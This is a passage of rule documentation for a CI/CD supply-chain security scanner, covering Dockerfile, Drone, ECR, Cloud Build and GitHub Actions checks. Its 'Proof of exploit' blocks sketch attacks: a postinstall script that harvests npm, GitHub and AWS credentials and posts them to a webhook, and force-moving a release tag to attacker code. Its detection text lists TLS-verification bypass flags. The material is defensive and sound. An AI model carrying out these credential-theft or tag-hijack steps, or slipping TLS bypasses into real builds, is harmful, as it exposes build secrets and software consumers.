**Recommendation.** Switch to ``npm ci`` (or ``yarn install --frozen-lockfile`` / ``pnpm install --frozen-lockfile`` for those toolchains). ``npm ci`` requires a ``package-lock.json`` and fails the build if it disagrees with ``package.json``; it never rewrites the lockfile and never installs packages outside the locked set. ``npm install`` does the opposite: it resolves ranges in ``package.json`` at build time and happily mutates the lockfile to fit the resolution, so a transient dependency the team never reviewed can land in the image.

**Known false positives.**

- Multi-stage build whose runtime image copies in a pre-computed ``node_modules`` and never installs at build time is unaffected, the rule only fires on directives that actually invoke ``npm install``.
- ``npm install --production`` is still flagged: it ignores ``devDependencies`` but still re-resolves and mutates the lockfile. Use ``npm ci --omit=dev`` instead.

**Source:** [`DF-022`](../providers/dockerfile.md#df-022) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-024`: RUN npm/yarn/pnpm install runs lifecycle scripts <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-024 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires on ``npm install`` / ``npm ci`` / ``npm i`` (non-global), ``pnpm install`` / ``pnpm i``, and ``yarn install`` / bare ``yarn`` in a ``RUN`` body when ``--ignore-scripts`` is absent from the same line. Detection short-circuits when the same Dockerfile sets ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` (``npm``), ``ENV YARN_ENABLE_SCRIPTS=false`` (yarn berry), or ``ENV CI=true`` is paired with an ``.npmrc`` configured to disable scripts (the env-level kill-switch is detected; the rule trusts ``.npmrc`` only when it's also written by the Dockerfile via ``echo ignore-scripts=true >> .npmrc``). Complements DF-022 (``npm ci`` vs ``npm install``), which guards lockfile integrity; DF-024 guards lifecycle-script execution. A pinned lockfile does not help when the pinned version is the malicious one, only ``--ignore-scripts`` does.

**Recommendation.** Pass ``--ignore-scripts`` to every ``npm`` / ``npm ci`` / ``pnpm install`` / ``yarn install`` invocation in the Dockerfile, or set ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` / ``ENV YARN_ENABLE_SCRIPTS=false`` before the install line. Lifecycle scripts (``preinstall``, ``install``, ``postinstall``, ``prepare``) are the blast radius of the Shai-Hulud / TanStack / axios incidents, a single compromised dependency in the transitive tree runs arbitrary code with the build container's credentials. ``--ignore-scripts`` removes that primitive without affecting lockfile resolution; the few legitimate consumers (``node-gyp``-based native modules) should be allow-listed via a follow-up ``npm rebuild <pkg> --ignore-scripts=false`` line scoped to the specific package.

**Known false positives.**

- Images that build native modules via ``node-gyp`` need the lifecycle scripts to compile bindings (``better-sqlite3``, ``sharp``, ``canvas``, ...). The fix is per-package: keep the top-level install on ``--ignore-scripts``, then ``RUN npm rebuild better-sqlite3`` afterward, scoped to the audited package. Suppress with a one-line rationale only when an engineer has confirmed every script-running dep is first-party or pinned to a hash.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): postinstall scripts in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. ``--ignore-scripts`` neutralizes the postinstall primitive at install time.
- TanStack / Mistral npm compromise (May 2026): 84 versions across 42 packages published in minutes, each carrying a credential-stealing ``postinstall``. Lockfile pinning did not help (the pinned tag itself was poisoned); ``--ignore-scripts`` would have stopped execution.

**Proof of exploit.**

```
# Vulnerable: postinstall in a transitive dep runs with the
# builder's environment (NPM_TOKEN, GH_TOKEN, AWS_*).
FROM node:20@sha256:<digest>
COPY package.json package-lock.json ./
RUN npm ci          # <-- runs postinstall of every dep

# Attack: the compromised package's package.json carries:
#   "scripts": { "postinstall": "node ./harvest.js" }
# harvest.js reads ~/.npmrc, process.env, ~/.aws/credentials
# and POSTs them to a webhook. The image is also tampered:
# the script writes a second-stage loader into node_modules
# that runs at every container start.

# Safe: scripts disabled at install time; rebuild only the
# audited native-module set afterward.
FROM node:20@sha256:<digest>
ENV NPM_CONFIG_IGNORE_SCRIPTS=true
COPY package.json package-lock.json ./
RUN npm ci --ignore-scripts
RUN npm rebuild better-sqlite3 sharp    # audited allowlist
```

**Source:** [`DF-024`](../providers/dockerfile.md#df-024) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-026`: ENV disables Node.js TLS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-026 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires on any ``ENV NODE_TLS_REJECT_UNAUTHORIZED=`` value that resolves to ``0`` (or the string ``"0"``). The documented Node.js mechanism for disabling TLS verification, applies to every TLS socket the runtime opens for the rest of the image's life. ``ENV ... =1`` (re-enable) and ``ENV ... =`` (clear) pass. The same primitive shows up in npm postinstall logs whenever a dep tries to fetch over a network the runner can't verify; once the env is set, the failure mode that caught the bad cert is gone.

**Recommendation.** Remove the ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0`` instruction. The variable tells Node's TLS layer to accept any certificate the upstream presents — self-signed, expired, hostname-mismatched, attacker-presented. Anything baked into ``ENV`` applies to every Node process the image ever launches: ``npm install``, ``npm publish``, runtime fetch calls, postinstall scripts. The attacker doesn't need to compromise the registry — they only need to MITM the network path between the container and any HTTPS endpoint.

If the internal registry / API genuinely has a self-signed cert, install the CA into the image's truststore instead: ``COPY ca.crt /usr/local/share/ca-certificates/`` + ``RUN update-ca-certificates`` (Debian) or ``RUN cat ca.crt >> /etc/ssl/certs/ca-certificates.crt`` (Alpine). The CA install is a one-time build cost; the bypass is a permanent runtime liability.

**Known false positives.**

- Test-only images that interact with a local mock server using a throwaway self-signed cert sometimes set this intentionally. Keep the bypass scoped to a separate ``test`` build stage and DON'T copy it into the final image; the production stage should never carry the variable. Suppress on the test-stage Dockerfile with a rationale that names the mock server.

**Source:** [`DF-026`](../providers/dockerfile.md#df-026) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-027`: ENV disables Python HTTPS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-027 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires on ``ENV PYTHONHTTPSVERIFY=0`` (also the stringy ``"0"``). The variable is the documented Python mechanism for disabling stdlib HTTPS verification; once set in the image ENV, every ``urllib``-based TLS connection (and the libraries that delegate to it) accept any certificate.

Complements DF-021 (``pip install`` TLS bypass via flags) and DF-026 (Node TLS bypass via env). Together the three cover the same primitive shape across pip-flag, Node-env, and Python-env surfaces.

**Recommendation.** Remove the ``ENV PYTHONHTTPSVERIFY=0`` instruction. The variable tells Python's stdlib ``urllib`` and any library that delegates to it (most of them) to accept any TLS certificate. The bypass applies to every subsequent process — ``pip install``, runtime API calls, postinstall scripts — for the rest of the image's life. The same primitive in flag form (``pip install --trusted-host``) is DF-021's surface; DF-027 catches the env-var form that affects every Python invocation, not just pip.

If the internal index has a self-signed cert, install the CA into the image's truststore (``REQUESTS_CA_BUNDLE`` pointing at a real CA bundle, or ``update-ca-certificates`` for the system bundle) rather than blanket-disabling verification.

**Source:** [`DF-027`](../providers/dockerfile.md#df-027) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-028`: ENV disables Git TLS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-028 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires on ``ENV GIT_SSL_NO_VERIFY`` set to any truthy value (``1``, ``true``, ``yes``, ``on``). The documented Git mechanism for disabling SSL verification per-process; in ``ENV`` form, every Git operation the image runs (and every downstream tool that shells out to ``git``) sees the bypass.

Pairs with DF-026 (Node TLS), DF-027 (Python TLS), and DF-029 (Python requests TLS) for the env-var-based TLS-bypass surface.

**Recommendation.** Remove the ``ENV GIT_SSL_NO_VERIFY`` instruction (or set it to ``0`` / unset it explicitly). The variable tells every ``git clone`` / ``git fetch`` / ``git pull`` in the image to accept any TLS certificate the upstream presents. Baked into ``ENV`` it applies to:

* ``RUN git clone`` in subsequent build stages
* ``git+https://...`` deps that pip / npm / cargo / go   modules clone at install time
* Any runtime process that shells out to ``git``   (release-publishing scripts, mirror jobs, GitOps   agents reading from the image)

If you need to clone from an internal Git server with a self-signed cert, install the CA into the image's truststore — same fix as DF-026 / DF-027. The TLS-bypass primitive doesn't need to be image-wide for any legitimate use case.

**Source:** [`DF-028`](../providers/dockerfile.md#df-028) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-029`: ENV neuters Python requests CA bundle <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-029 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires when ``ENV REQUESTS_CA_BUNDLE`` resolves to a value that disables verification:

* ``/dev/null`` (literal),
* the empty string (``ENV REQUESTS_CA_BUNDLE=`` or   ``ENV REQUESTS_CA_BUNDLE=""``),
* whitespace-only values.

A path to a real file (``/etc/ssl/certs/...``, ``/usr/local/share/ca-certificates/internal.crt``) passes — the rule only flags the disable shapes. Pairs with DF-027 (Python TLS via env).

**Recommendation.** Set ``ENV REQUESTS_CA_BUNDLE`` to the path of a real CA bundle (typically ``/etc/ssl/certs/ca-certificates.crt`` on Debian or ``/etc/ssl/cert.pem`` on Alpine), or unset it entirely so the ``requests`` library falls back to ``certifi``. Pointing the variable at ``/dev/null`` or an empty string is a documented anti-pattern: ``requests`` treats the empty / missing bundle as 'verify against nothing,' which silently accepts every certificate.

The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — ``REQUESTS_CA_BUNDLE`` only affects ``requests`` and its descendants, not the stdlib ``urllib``. Still a real bypass because most Python network clients (pip, AWS CLI, Anchore, Trivy, every Django app) flow through ``requests``.

**Source:** [`DF-029`](../providers/dockerfile.md#df-029) in the [Dockerfile provider](../providers/dockerfile.md).

### `DR-001`: Step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detection mirrors the GL-001 / JF-009 / ADO-009 / CC-003 family: any container ``image:`` whose ref doesn't end in ``@sha256:<64 hex>`` fires. ``:latest`` and missing-tag references emit the strongest message; a specific-version tag (``golang:1.21.5``) still fires but can be fixed with a one-line digest swap. The rule scopes itself to ``type: docker`` / ``kubernetes`` pipelines (the container-flavored ones); ``ssh`` / ``exec`` / ``digitalocean`` pipelines have no ``image:`` field and pass-by-default.

**Recommendation.** Pin every step ``image:`` (and every ``services:`` image) to ``@sha256:<digest>``. Drone resolves the image ref at run time, so a tag like ``golang:1.21`` resolves against whatever the registry currently serves and a compromised registry can swap content under a fixed tag. Capture the digest once with ``docker buildx imagetools inspect golang:1.21`` (or ``crane digest golang:1.21``) and update the digest deliberately when the upstream version moves.

**Known false positives.**

- Local-build images (``image: my-org/build-tools:dev`` produced upstream in the same pipeline) sometimes can't be digest-pinned because the digest depends on the build. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the floating-tag risk still applies to every public-registry pull.

**Proof of exploit.**

```
# Vulnerable: ``golang:1.21`` is a mutable tag. Docker Hub
# (or any compromise of the publisher's account) repoints
# the tag at a new image on the next 1.21.x patch release
# and the next pipeline run pulls the swap silently.
kind: pipeline
type: docker
name: build
steps:
  - name: test
    image: golang:1.21
    commands:
      - go test ./...

# Safe: pin to the content-addressable digest. Renovate /
# Dependabot bump the digest in reviewable PRs.
kind: pipeline
type: docker
name: build
steps:
  - name: test
    image: golang@sha256:abc123...
    commands:
      - go test ./...
```

**Source:** [`DR-001`](../providers/drone.md#dr-001) in the [Drone CI provider](../providers/drone.md).

### `DR-005`: Plugin step uses a floating image tag <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-005 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Drone treats a step as a plugin when it has a ``settings:`` block. The ``image:`` field still names the container that runs, and the same supply-chain argument as DR-001 applies; this rule fires specifically on plugin steps using a floating tag (``:latest``, no tag, or a non-version-shaped tag) rather than every unpinned image, so a maintainer weighing trade-offs can ratchet plugin pinning up first. A pinned-version tag (``plugins/docker:20.13.0``) passes this rule but still trips DR-001 for the wider supply-chain hardening.

**Recommendation.** Pin every plugin step's ``image:`` to ``@sha256:<digest>`` or, at minimum, a specific version tag (``plugins/docker:20.13.0`` rather than ``plugins/docker:latest`` or ``plugins/docker``). Plugin steps are a sharper attack surface than ordinary steps because Drone passes every ``settings:`` key to the plugin as an environment variable, including any secret references; a malicious plugin replacement can exfiltrate the entire credential set the step was trusted with.

**Known false positives.**

- Internal-registry plugins built and pushed by the same pipeline (``image: my-org/internal-plugin:dev`` produced upstream) sometimes can't be exact-pinned. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape.

**Proof of exploit.**

```
# Vulnerable: ``plugins/docker:latest`` resolves at runner
# start to whatever Docker Hub currently serves under the
# ``latest`` tag. Whoever controls the plugin repo (or
# anyone with publisher access) ships code into every
# pipeline that uses the plugin.
kind: pipeline
type: docker
name: publish
steps:
  - name: push-image
    image: plugins/docker:latest
    settings:
      repo: myorg/app
      tags: latest

# Safe: pin the plugin image to a content-addressable
# digest. The plugin can't be repointed without changing
# the pipeline file (and a reviewable PR with it).
kind: pipeline
type: docker
name: publish
steps:
  - name: push-image
    image: plugins/docker@sha256:abc123...
    settings:
      repo: myorg/app
      tags: ${DRONE_TAG}
```

**Source:** [`DR-005`](../providers/drone.md#dr-005) in the [Drone CI provider](../providers/drone.md).

### `DR-006`: TLS verification disabled in step commands <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-006 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Uses the cross-provider ``_primitives.tls_bypass`` detector shared with GHA-027, BK-008, JF-022, ADO-026, CC-024, GCB-011, and the CFN / Terraform rule packs. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. The rule scans every ``commands:`` entry on every step.

**Recommendation.** Remove TLS-bypass flags from build commands. The most common offenders are ``curl --insecure`` / ``-k`` / ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslverify=false``. Each exposes the build to TLS-MITM injection of a registry-served payload, which is a textbook supply-chain attack vector. If a registry's certificate is genuinely broken, fix the registry rather than permanently disabling verification, the bypass tends to outlive the broken cert and become a permanent weakness.

**Proof of exploit.**

```
# Vulnerable: every npm install in the build skips strict-
# ssl validation. An attacker on the network path (corp
# proxy, malicious mirror, BGP hijack) MITMs the registry
# and ships malicious tarballs that npm installs without
# any signal.
kind: pipeline
type: docker
name: build
steps:
  - name: install
    image: node:20@sha256:abc123...
    commands:
      - npm config set strict-ssl false
      - npm install

# Safe: install the missing CA into the image (or use the
# default trust store). Never disable TLS verification
# pipeline-wide; if a registry's cert is broken, fix the
# registry rather than papering over with a bypass that
# outlives the broken cert.
kind: pipeline
type: docker
name: build
steps:
  - name: install
    image: node:20@sha256:abc123...
    commands:
      - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
      - update-ca-certificates
      - npm install
```

**Source:** [`DR-006`](../providers/drone.md#dr-006) in the [Drone CI provider](../providers/drone.md).

### `DR-008`: Step uses ``pull: never`` (skips registry verification) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-dr-008 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Drone supports three ``pull:`` policies on a step: ``always`` (re-fetch + verify on every build, the default), ``if-not-exists`` (use cache when present, otherwise pull), and ``never`` (use cache only). The ``never`` policy is the dangerous one because it skips the digest verification an ``always`` pull would perform, and there's no out-of-band signal that the cached image is the one the manifest names. The rule fires on either steps or services declaring ``pull: never``. ``pull: if-not-exists`` is treated as acceptable: it's tolerable when paired with a digest-pinned ``image:`` (DR-001) and a deliberate operational decision; the explicit-skip case (``never``) is what TAINT-class supply-chain attacks lean on.

**Recommendation.** Drop the ``pull: never`` directive (or change it to ``pull: always`` / ``pull: if-not-exists``). ``pull: never`` tells the Drone agent to skip the registry round-trip entirely, so the agent runs whatever image bytes it cached on a previous build without re-verifying the digest. If a compromised image ever landed in the agent's local cache (a poisoned registry tag, a manual ``docker pull`` during a debug session, a co-resident workload that pulled a malicious image), the cached bytes keep running until an operator manually clears the cache. ``pull: always`` (the Drone default) re-fetches and verifies on every build; ``pull: if-not-exists`` is acceptable when the image is digest-pinned (DR-001) so the cache key is content-addressed.

**Known false positives.**

- Air-gapped or registry-pinned environments sometimes set ``pull: never`` deliberately because the agent never has registry access in the first place. Suppress via ignore-file when this is the deliberate shape; the runner's network isolation then carries the integrity guarantee instead of the registry round-trip.

**Source:** [`DR-008`](../providers/drone.md#dr-008) in the [Drone CI provider](../providers/drone.md).

### `ECR-001`: Image scanning on push not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-001 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** scan-on-push runs a CVE check against the image's OS package layers at the moment it lands in ECR. Without it, an image with a known CVE deploys silently. The ECR basic scanner is free; ECR-007 covers the Inspector v2 enhanced scanner that adds language-ecosystem CVEs (npm, pip, gem).

**Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.

**Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Mutable tags mean ``:latest``, ``:v1.0``, and ``:stable`` can be re-pushed silently, the same tag points to different image content over time. Pinning by digest (``sha256:...``) in deployment manifests is the only durable reference; IMMUTABLE on the repo enforces the property registry-side so a forgotten digest reference doesn't drift.

**Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.

**Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-005`: Repository encrypted with AES256 rather than KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-005 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Same shape as CP-002 / CWL-002 / CCM-002: AES256 (the AWS-managed default) gives confidentiality at rest but no key-policy or CloudTrail Decrypt-event story. Container images are arguably sensitive intellectual property, the same key-policy + audit shape as build outputs in S3 is warranted.

**Recommendation.** Set encryptionType=KMS with a customer-managed key ARN.

**Source:** [`ECR-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-006`: ECR pull-through cache rule uses an untrusted upstream <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-006 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization, [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS.

**How this is detected.** AWS supports pull-through cache for ECR Public, Quay, K8s, GitHub Container Registry, GitLab, and Docker Hub. A rule pointing at ``registry-1.docker.io`` without an authenticated credential silently caches whatever the public namespace resolves to.

**Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.

**Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-007`: Inspector v2 enhanced scanning disabled for ECR <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-007 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** ECR-001's basic on-push scan covers OS-level packages, apt / yum / apk lineage. Most production CVE risk is in language ecosystems (npm, pip, gem, mvn) which the basic scanner ignores. Inspector v2 enhanced scanning closes that gap and runs continuously, so a CVE published two weeks after a build still surfaces against the deployed image.

**Recommendation.** Enable Amazon Inspector v2 for the ``ECR`` scan type on this account. Basic ECR scanning on-push only covers OS packages; Inspector v2 enhanced scanning adds language-ecosystem CVEs and runs continuously as new vulnerabilities are published.

**Source:** [`ECR-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `GCB-001`: Cloud Build step image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Bare references (``gcr.io/cloud-builders/docker``) are treated as ``:latest`` by Cloud Build. Tag-only references (``:20``, ``:latest``) count as unpinned. Only ``@sha256:…`` suffixes pass.

**Recommendation.** Pin every ``steps[].name`` image to an ``@sha256:<digest>`` suffix. ``gcr.io/cloud-builders/docker:latest`` is mutable; Google publishes new builder images frequently and the next build would pull whatever is current. Resolve the digest with ``gcloud artifacts docker images describe <ref> --format='value(image_summary.digest)'`` and pin it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``gcr.io/cloud-builders/gcloud`` resolves to
# the registry's latest at build time. Google's update of
# the underlying image is silently picked up; a namespace
# / publisher takeover would ship malicious code into
# every Cloud Build that uses the step.
steps:
  - name: gcr.io/cloud-builders/gcloud
    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]

# Safe: pin to the content-addressable digest. Renovate /
# Dependabot bump the digest in reviewable PRs.
steps:
  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]
```

**Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-008`: No vulnerability scanning step in Cloud Build pipeline <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-008 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** The detector matches tool names anywhere in the document, step images, ``args``, or ``entrypoint`` strings. Container Analysis API scanning configured at the project level counts as compensating control but is out of scope for this YAML-only check; if you rely on it, suppress this rule via ``--checks``.

**Recommendation.** Add a step that runs a vulnerability scanner, trivy, grype, snyk test, npm audit, pip-audit, osv-scanner, or govulncheck. In Cloud Build this typically looks like a step with ``name: aquasec/trivy`` or an ``entrypoint: bash`` step that invokes ``trivy image`` / ``grype <ref>`` on the built image.

**Source:** [`GCB-008`](../providers/cloudbuild.md#gcb-008) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-009`: Artifacts not signed (no cosign / sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-009 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Silent-pass when the pipeline does not appear to produce artifacts (no ``docker push`` / ``gcloud run deploy`` / ``kubectl apply`` / etc. in any step). The detector matches cosign, sigstore, slsa-framework, and notation.

**Recommendation.** Add a signing step before ``images:`` is resolved, for example, a step with ``name: gcr.io/projectsigstore/cosign`` that runs ``cosign sign --yes <registry>/<repo>@<digest>``. Pair with an attestation step (``cosign attest --predicate sbom.json --type cyclonedx``) so consumers can verify both the signature and the build provenance.

**Source:** [`GCB-009`](../providers/cloudbuild.md#gcb-009) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-011`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-011 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Covers ``curl -k`` / ``wget --no-check-certificate``, ``git config http.sslVerify false``, ``NODE_TLS_REJECT_UNAUTHORIZED=0``, ``npm config set strict-ssl false``, ``PYTHONHTTPSVERIFY=0``, ``GOINSECURE=``, ``helm --insecure-skip-tls-verify``, ``kubectl --insecure-skip-tls-verify``, and ``ssh -o StrictHostKeyChecking=no``.

**Recommendation.** Fix the underlying certificate issue, install the correct CA bundle into the step image, or point the tool at a mirror that presents a valid chain. Disabling verification trades a build error for a silent MITM window.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``curl -k`` disables certificate verification
# for the duration of the call. An attacker on the network
# path (compromised proxy, malicious VPN exit) MITMs the
# response and ships substituted bytes into the build.
steps:
  - name: gcr.io/cloud-builders/curl@sha256:abc123...
    args: [-k, -O, https://internal-mirror.example.com/artifact.tar.gz]

# Safe: keep TLS verification on. If the internal mirror
# uses a private CA, install the CA into the step image's
# trust store rather than papering over with ``-k``.
steps:
  - name: gcr.io/cloud-builders/curl@sha256:abc123...
    args: [-O, https://internal-mirror.example.com/artifact.tar.gz]
```

**Source:** [`GCB-011`](../providers/cloudbuild.md#gcb-011) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GHA-001`: Action not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Every `uses:` reference should pin a specific 40-char commit SHA. Tag and branch refs (`@v4`, `@main`) can be silently moved to malicious commits by whoever controls the upstream repository, a third-party action compromise will propagate into the pipeline on the next run.

**Recommendation.** Replace tag/branch references (`@v4`, `@main`) with the full 40-char commit SHA. Use Dependabot or StepSecurity to keep the pins fresh.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): a malicious commit retagged behind ``@v1`` / ``@v45`` shipped CI-secret exfiltration to roughly 23,000 repos that had pinned the action to a mutable tag instead of a commit SHA.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week, similar mechanism. Tag-pinned consumers auto-pulled the malicious version; SHA-pinned consumers were unaffected.

**Proof of exploit.**

```
# Tag-pinned reference (vulnerable):
- uses: tj-actions/changed-files@v45

# Attack: the upstream maintainer (or anyone who compromises
# the upstream repo) force-moves the v45 tag to a malicious
# commit:
#   git tag -f v45 <attacker-controlled-sha>
#   git push --force origin v45
# Every consumer's next workflow run pulls the new code
# automatically, executing the attacker's payload with the
# job's secrets and GITHUB_TOKEN in scope.

# Safe: pin to a 40-char commit SHA (immutable):
- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0
```

**Source:** [`GHA-001`](../providers/github.md#gha-001) in the [GitHub Actions provider](../providers/github.md).

### `GHA-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-006 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step, e.g. `sigstore/cosign-installer` followed by `cosign sign`, or `slsa-framework/slsa-github-generator` for keyless SLSA provenance. Publish the signature alongside the artifact and verify it at consumption time.

**Seen in the wild.**

- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): SUNBURST trojanized builds shipped to ~18,000 customers because no post-build signature could be checked against a trusted signing identity. Cryptographic signing on every release would have given downstream consumers a verifiable break with the upstream key, the absence of which was the ambient signal of compromise.
- [PyTorch nightly compromise](https://pytorch.org/blog/compromised-nightly-dependency/) (December 2022): the ``torchtriton`` dependency was hijacked via PyPI dependency-confusion. Sigstore-style attestation tied to the official publisher would have made the impostor build fail verification rather than silently install.

**Source:** [`GHA-006`](../providers/github.md#gha-006) in the [GitHub Actions provider](../providers/github.md).

### `GHA-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.

**Source:** [`GHA-007`](../providers/github.md#gha-007) in the [GitHub Actions provider](../providers/github.md).

### `GHA-014`: Deploy job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-014 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

